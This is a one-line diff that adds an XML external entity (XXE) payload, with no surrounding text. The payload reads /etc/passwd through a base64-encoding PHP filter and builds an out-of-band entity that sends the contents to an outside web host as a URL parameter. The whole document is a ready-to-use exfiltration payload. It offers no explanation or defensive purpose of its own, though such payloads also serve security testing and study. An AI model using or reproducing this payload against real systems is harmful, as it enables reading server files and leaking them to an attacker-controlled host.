@@ -1,0 +1,1 @@
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> <!ENTITY % oob "<!ENTITY &#x25; content SYSTEM 'https://muradx0.github.io/blog/xxe.dtd/?content=%file;'>"> 
